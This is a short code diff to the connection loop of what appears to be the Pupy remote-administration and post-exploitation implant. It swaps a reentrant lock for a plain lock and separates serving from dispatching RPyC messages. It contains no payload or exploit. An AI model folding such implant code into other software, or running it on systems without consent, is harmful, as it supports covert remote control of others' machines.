@@ -780,7 +780,7 @@ def rpyc_loop(launcher):
                 t.daemon = True
                 t.start()
 
-                lock = threading.RLock()
+                lock = threading.Lock()
                 conn = None
 
                 try:
@@ -801,8 +801,12 @@ def rpyc_loop(launcher):
                 pupy.connected = True
                 logger.debug('Serve')
                 while not conn.closed:
+                    data = None
                     with lock:
-                        conn.serve()
+                        data = conn.serve()
+
+                    if data:
+                        conn.dispatch(data)
 
         except SystemExit:
             raise
